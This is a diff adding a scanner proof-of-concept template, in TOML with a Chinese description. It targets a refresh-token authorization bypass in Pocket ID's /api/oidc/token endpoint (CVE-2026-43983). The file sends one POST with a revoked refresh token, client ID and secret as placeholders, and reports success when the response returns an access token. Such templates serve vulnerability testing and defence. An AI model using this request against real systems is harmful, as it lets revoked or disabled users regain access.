@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证在用户账户被禁用或授权被撤销后，通过 /api/oidc/token 接口使用刷新令牌是否仍能获取新令牌"
+id = "POC-AVE-2026-0694"
+name = "Pocket ID OIDC Refresh Token Authorization Bypass PoC"
+severity = "high"
+tags = ["ave-2026-0694"]
+vuln_id = [
+    "CVE-2026-43983",
+    "AVE-2026-0694",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/oidc/token"
+protocol = "http"
+
+[poc.requests.body]
+content = "grant_type=refresh_token&refresh_token=REPLACE_WITH_REVOKED_TOKEN&client_id=REPLACE_WITH_CLIENT_ID&client_secret=REPLACE_WITH_CLIENT_SECRET"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["access_token"]
